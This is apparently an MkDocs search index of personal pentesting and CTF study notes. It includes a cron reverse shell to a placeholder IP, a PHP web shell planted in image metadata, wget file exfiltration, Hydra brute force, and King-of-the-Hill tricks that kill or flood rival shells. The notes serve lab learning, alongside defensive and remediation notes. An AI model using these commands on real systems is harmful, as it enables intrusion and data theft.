{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Obsidian Notes","text":"<p>Publish your public notes with MkDocs</p>"},{"location":"#hello-world","title":"Hello World!","text":"<p>The <code>index.md</code> in the <code>/docs</code> folder is the homepage you see here.</p> <p>The folders in <code>/docs</code> appear as the main sections on the navigation bar.</p> <p>The notes appear as pages within these sections. For example, [[Note 1]] in <code>Topic 1</code></p>"},{"location":"Commands/","title":"Commands","text":"<p>Stabalize Shell Spawn</p> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n/usr/bin/script -qc /bin/bash /dev/null\n</code></pre>"},{"location":"Commands/#python-server-start","title":"Python Server Start","text":"<pre><code>python3 -m http.server --bind 10.17.47.159 9000\n</code></pre>"},{"location":"Commands/#hydra-http-post-from-brute-force","title":"HYDRA HTTP-POST FROM BRUTE FORCE","text":"<pre><code>hydra -l &lt;Login_Name&gt; -P &lt;wordlist&gt; 10.10.145.133 http-post-form '/admin/:user=^USER^&amp;pass=^PASS^:Username or password invalid'\n</code></pre>"},{"location":"Commands/#generate-password-hash-for-etcshadow","title":"GENERATE PASSWORD HASH FOR /etc/shadow","text":"<pre><code>mkpasswd -m sha-512 newpasswordhere\n</code></pre> <p>steghide extract -sf Alice-White-Rabbit.jpg</p> <p>exiftool -Notes='&lt;?php system($_GET[\"cmd\"]); ?&gt;' a.jpeg</p> <p>http://victim.machine/uploads/image.php.png?cmd=ls</p> <p>echo '[Service] Type=oneshot ExecStart=/bin/sh -c \"id &gt; /tmp/output\" [Install] WantedBy=multi-user.target' &gt; $TF</p> <p>rustscan -a owl.thm -- -sC -sV -A -oA yearoftheowl -v --ulimit 10000</p>"},{"location":"Key%20Points/","title":"Key Points","text":"<p>when an application is vulnerable to LFI hum bhot sari files ko check kr skte haI</p>"},{"location":"Protect%20King/","title":"Protect King","text":""},{"location":"Protect%20King/#make-kingtxt-unwritable","title":"Make king.txt unwritable","text":""},{"location":"Protect%20King/#using-noclobber","title":"Using noclobber","text":"<pre><code>set -o noclobber /root/king.txt\n</code></pre>"},{"location":"Protect%20King/#using-chattr","title":"Using chattr","text":"<p><pre><code> chattr +ai /root/king.txt\n</code></pre> If chattr binary is not present on the machine you can download it into your machine and after compiling you can upload into KOTH_machine and use it</p> <p>Downloading into Local Machine  <code>wget https://github.com/posborne/linux-programming-interface-exercises/blob/master/15-file-attributes/chattr.c gcc chattr.c -o chattr <pre><code>Uploading to KOTH_machine\n</code></pre> python3 -m http.server 8080       //on your local machine start a python server wget http://yourip:port/chattr   //on the KOTH_machine for download the binary chmod +x chattr ./chattr +ai /root/king.txt <pre><code>-----------------------------------------------------------------------------\n-----------------------------------------------------------------------------\n## Use . for creating hidden directory where you can store your binaries\n</code></pre> mkdir .hidden_folder cd .hidden_folder <pre><code>-----------------------------------------------------------------------------\n-----------------------------------------------------------------------------\n## Use Cronjobs for automation\n&gt; **Run 'crontab -e' and paste these line**\n### Reverse shell\n</code></pre> * * * * * /bin/sh -i &gt;&amp; /dev/tcp/YOUR_IP/LISTENING_PORT 0&gt;&amp;1 <pre><code>### Write to king.txt\n</code></pre> * * * * * echo \"USERNAME\" &gt; /root/king.txt &gt;/dev/null 2&gt;&amp;1 <pre><code>-----------------------------------------------------------------------------\n-----------------------------------------------------------------------------\n## Breaking opponent shell\n### find opponent pts using these commands\n</code></pre> who ps aux | grep pts w tty    // find your pts for not breaking you shell accidentally <pre><code>### Spam urandom to opponent shell\n</code></pre> cat /dev/urandom &gt;/dev/pts/# <pre><code>&gt;  **NOTE: place opponent pts in place of '#'**\n### Using script\n</code></pre> script -f /dev/pts/# <pre><code>### Spam your username to opponent shell\n</code></pre> while true; do echo 'YOUR_USERNAME' &gt;/dev/pts/#; done  <pre><code>### Kill opponent shell\n</code></pre> pkill -9 -t pts/# <pre><code>### Using nyancat\nDownloading nyancat to local Machine\n</code></pre> git clone https://github.com/klange/nyancat cd nyancat/src make <pre><code>Sending nyancat to KOTH_machine\n</code></pre> python3 -m http.server 8080        //on your local machine start a python server into 'nyancat/src' folder wget http://yourip:port/nyancat   //on the KOTH_machine chmod +x nyancat ./nyancat &gt; /dev/pts/# <pre><code>-----------------------------------------------------------------------------\n-----------------------------------------------------------------------------\n## while loop Tricks\n</code></pre> (1). while [$(cat /root/king.txt) != \"YOUR_USERNAME\"](&lt;$(cat /root/king.txt) != \"YOUR_USERNAME\"&gt;); do echo \"YOUR_USERNAME\" &gt; /root/king.txt; done (2). while true; do chattr -ia /root/king.txt 2&gt;/dev/null; echo \"YOUR_USERNAME\" &gt;/root/king.txt 2&gt;/dev/null; chattr +ia /root/king.txt 2&gt;/dev/null; done</code></p>"},{"location":"Protect%20King/#keep-connected-more-coming-in-future","title":"Keep connected more coming in future......","text":""},{"location":"Symbols/","title":"Symbols","text":"<p>\u2705  \u274c  \u26a0\ufe0f  \u2753 \u00ae\ufe0f</p>"},{"location":"Cyber%20Security/Jr.%20Pentester/","title":"Introduction","text":""},{"location":"Cyber%20Security/Jr.%20Pentester/#defensive-security","title":"Defensive Security","text":"<p>Main tasks in ds :  1. Preventing intrusion from occurring  2. Detecting intrusion when they occur and responding properly</p>"},{"location":"Cyber%20Security/Jr.%20Pentester/#area-of-defensive-security","title":"Area of defensive security","text":"<p>SOC :: Security Operation Centre - team of cyber security professionals that monitors the network and its system  to detect malicious cyber security events  Areas of interest : - Vulnerabilities - Policy Violation - Un-authorized activities  - Network Intrusions</p>"},{"location":"Cyber%20Security/Jr.%20Pentester/#threat-intelligence","title":"Threat Intelligence","text":"<p>in our context intelligence refers to the information you gather and potential enemies . A threat is any action that can disrupt or adversely affect a system . TI aims to gather information to help company to prepare against potential adversaries </p> <p>Intelligence needs data. Data has to be collected, processed, and analyzed. Data collection is done from local sources such as network logs and public sources such as forums. Processing of data aims to arrange them into a format suitable for analysis. The analysis phase seeks to find more information about the attackers and their motives; moreover, it aims to create a list of recommendations and actionable steps.</p> <p>xz</p>"},{"location":"Cyber%20Security/Jr.%20Pentester/#digital-forensics-and-incident-response","title":"Digital Forensics and Incident Response","text":"<ul> <li>Digital Forensics</li> <li>Incident Response</li> <li>Malware Analysis Forensics is the science to investigate crime and establish facts</li> </ul> <p>In defensive sec the focus of digital forensics is shifts to analyzing evidence of an attack </p>"},{"location":"Cyber%20Security/Jr.%20Pentester/#incident-response","title":"Incident Response","text":"<p>Four major phases of incident response  1. Preparation 2. Detection and Analysis  3. Containment , Eradication and Recovery 4. Post Incident Activity  </p>"},{"location":"Cyber%20Security/Jr.%20Pentester/#malware-analysis","title":"Malware Analysis","text":"<ul> <li>static analysis - without running it </li> <li>dynamic analysis - running malware in an sandbox environemtn and monitoring its activities </li> </ul> <p>SIEM : SECURITY INFORMATION AND EVENT MANAGEMENT</p>"},{"location":"Cyber%20Security/Jr.%20Pentester/#careers-in-cyber-security","title":"Careers in Cyber Security","text":""},{"location":"Cyber%20Security/Jr.%20Pentester/#security-analyst","title":"Security Analyst","text":"<ul> <li>working with various stake holders to analyse the cyber security throughout the company</li> <li>compile ongoing reports about the safety of networks documenting security issues and taken in response</li> <li>develop security plans incorporating research on new attack tools </li> </ul>"},{"location":"Cyber%20Security/Jr.%20Pentester/#security-engineer","title":"Security Engineer","text":"<p>develop and implement security solutions using threat and vulnerability data - testing and screening security measures across software  - monitor network and report to update systems and mitigate vulnerabilities  - identify and implement systems needed for optimal security</p>"},{"location":"Cyber%20Security/Jr.%20Pentester/#incident-responder","title":"Incident Responder","text":"<p>respond productively  and effectively to security breaches - creating plans , policies and protocols for organizations to enact during and following incidents </p> <p>main role  is to achieve a swift and effective response, retain financial standing and avoid negative breach implication</p>"},{"location":"Cyber%20Security/Jr.%20Pentester/#introduction-to-web-hacking","title":"Introduction to Web Hacking","text":""},{"location":"Cyber%20Security/Jr.%20Pentester/#subdomain-enumeration","title":"SubDomain Enumeration","text":""},{"location":"Cyber%20Security/Jr.%20Pentester/#authententication-bypass","title":"Authententication Bypass","text":"<pre><code>:: Logic Flaws :: Scenario :: Reset Password\n:: Asked email -&gt; then username\n:: Performed ::\n `$_REQUEST` variable   stores the post data and data from query string\n\n application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.\nwhen then reset sent was request we added our own email address and we received the reset mail of other user\n]\n</code></pre>"},{"location":"Cyber%20Security/Jr.%20Pentester/#idor-insecure-direct-object-reference","title":"IDOR :: Insecure direct object reference","text":"<pre><code>to check idors create two accounts and compare the information\n</code></pre>"},{"location":"Cyber%20Security/Jr.%20Pentester/#file-inclusion","title":"File inclusion","text":"<pre><code>- Local File Inclusion\n- Remote File inclusion\n</code></pre> <p>-&gt; file_get_contents causes path traversal vulnerabilities  </p>"},{"location":"Cyber%20Security/Jr.%20Pentester/#remidiation","title":"Remidiation","text":"<ol> <li> <p>Keep system and services, including web application frameworks, updated with the latest version.  </p> </li> <li> <p>Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.</p> </li> <li>A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.</li> <li> <p>Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.  </p> </li> <li> <p>Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.</p> </li> <li> <p>Never trust user input, and make sure to implement proper input validation against file inclusion.  </p> </li> <li> <p>Implement whitelisting for file names and locations as well as blacklisting.</p> </li> </ol>"},{"location":"Cyber%20Security/Jr.%20Pentester/#server-side-request-foregery-ssrf","title":"Server Side Request Foregery :: SSRF","text":""},{"location":"Cyber%20Security/Jr.%20Pentester/#sqli","title":"SQLI","text":""},{"location":"Cyber%20Security/Jr.%20Pentester/#command-injection","title":"Command Injection","text":""},{"location":"Cyber%20Security/Key%20Points/","title":"Key Points","text":"<ul> <li>When using wget the default user agent used  </li> <li>If there is  some filtering we can bypass it . It\u2019s using Wget! If the application is just calling it with <code>exec()</code> or <code>system()</code>, maybe we can pull some shell shenanigans, to trick it into downloading our reverse shell, while keeping the <code>.php</code> file extension. I put in <code>http://10.10.14.144:8000/shell.php#a.jpg</code> as the URL. The PHP script will see the <code>.jpg</code> at the end, and accept it. However, the shell will ignore everything after the <code>#</code>, and Wget will ultimately download shell.php.</li> <li> <p>wget file upload esclation <pre><code>wget --post-file=$LFILE $URL\n</code></pre></p> </li> <li> <p>Network devices do what we tell them to do , not what we think they should do </p> </li> </ul>"},{"location":"Cyber%20Security/Network%20Services/","title":"Network Services","text":""},{"location":"Cyber%20Security/Network%20Services/#smb","title":"SMB","text":"<p>SMB - Server Message Block - request-response protocol  works on tcp/ip suite actually netbios over tcp/ip</p> <p>enum4linux is a tool for enumerating smb shares both on windows and linux systems wrapper around tools in samba and make it easy to quickly extract information </p> <p>Learn More About SMB</p>"},{"location":"Cyber%20Security/Network%20Services/#telnet","title":"Telnet","text":"<p>application protocol  -connect and execute command on a remote machine</p> <p>not secure - lacks encryption - slowly replace by ssh</p>"},{"location":"Cyber%20Security/Network%20Services/#ftp","title":"FTP","text":"<p>file transfer protocol  21 - command channel 20 - data channel </p> <ul> <li>In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it.\u00a0</li> <li>In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.</li> </ul>"},{"location":"Cyber%20Security/Network%20Services/#nfs","title":"NFS","text":"<p>Network File System : allows a system to share directory or files over network </p> <p>uses rpc to connect client and server</p> <p>Understand NFS how to it was exploited</p>"},{"location":"Cyber%20Security/Network%20Services/#smtp","title":"SMTP","text":"<p>Simple mail transfer protocol -&gt; sending of emails </p> <p>smtp performs 3 basic functions - verifies who send the email - sends the outgoing mail - if the outgoing mail cant be delivered it sends the message back to the sender</p>"},{"location":"Cyber%20Security/Network%20Services/#pop-and-imap","title":"POP and IMAP","text":""},{"location":"Cyber%20Security/Wordlists/","title":"Wordlists","text":""},{"location":"Cyber%20Security/Wordlists/#fuzzing-word-lists","title":"Fuzzing word lists","text":"<p>-ic ignore comments from wordlists</p> <p>Apache Directory  - /home/greedydev/wordlists/SecLists/Discovery/Web-Content/apache.txt</p> <p>Api - /home/greedydev/wordlists/SecLists/Discovery/Web-Content/api/</p> <p>PHP files - /home/greedydev/wordlists/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt</p> <p>Directory List - /home/greedydev/wordlists/SecLists/Discovery/Web-Content/ - /home/greedydev/wordlists/SecLists/Discovery/Web-Content/raft-large-files</p> <p>Extensions List - /home/greedydev/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions.txt - Web extensions     - /home/greedydev/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt</p> <p>Sub domains </p> <p>ffuf -u http://FUZZ.mydomain.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0</p> <p>For virtual host - $ ffuf -u http://mydomain.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.mydomain.com' -fs 0</p> <p><code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></p> <p><code>/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt</code></p> <p>ffuf -u http://FUZZ.creative.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -fs 0</p> <p>ffuf -u http://creative.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.creative.thm'   -fs 0</p>"},{"location":"Cyber%20Security/Web%20Vulnerabilites/File%20Upload/","title":"File Upload","text":"<p>File upload feature is a common feature provided by many websites for sharing files, document and other files. This common feature pose significant security risks if not implemented correctly . </p> <p>basically it is related to unrestricted file upload . user file is not sufficiently validated  like name content type size</p>"},{"location":"Cyber%20Security/Web%20Vulnerabilites/File%20Upload/#impact","title":"Impact","text":"<p>Depends upon two factor  - type of restrictions imposed on file once its uploaded on server - which aspect of the file  the website fails to validate</p>"},{"location":"Cyber%20Security/Web%20Vulnerabilites/File%20Upload/#how-do-web-servers-handle-requests-for-static-files","title":"How do web servers handle requests for static files ?","text":"<ul> <li>Identifying the file extension</li> <li>Checking whether the file is executable or non executable </li> <li>if the files is non executable such as image then the server send the file content in http response</li> <li>if the file is executable such as php files the  server is configured to execute file of this type, -it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.</li> <li>If the file type is executable, but the server is not configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an example of this in our information disclosure learning materials.</li> </ul>"},{"location":"Cyber%20Security/Web%20Vulnerabilites/File%20Upload/#preventing-file-execution-in-user-accessible-directories","title":"Preventing file execution in user-accessible directories","text":"<p>Servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead</p> <p>. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.</p> <p></p>"},{"location":"Cyber%20Security/Web%20Vulnerabilites/File%20Upload/#web-shell-upload-via-path-traversal","title":"Web shell upload via path traversal","text":"<p>Now if the uploaded file is saved in a directory say filesUploaded and execution of file is disabled in this directory.</p> <p>what we can do is in the file name we can use path traversal to save file to another directory where it is executable</p>"},{"location":"Programming/Programming%20Concepts%20KeyPoints/","title":"Programming Concepts KeyPoints","text":"<p>Points to Remember - Slow and fast pointer concept      - slowPointer = slowPointer.next  || fastPointer = fastPointer.next.next     - when fast.next == null  at that point slow pointer is at middle of the list 4     - The distance travelled by faster pointer is twice the distance travelled by slow pointer ::    D(fastPointer)  = 2 * D(slowPointer)</p>"},{"location":"blog/","title":"Blog","text":""}]}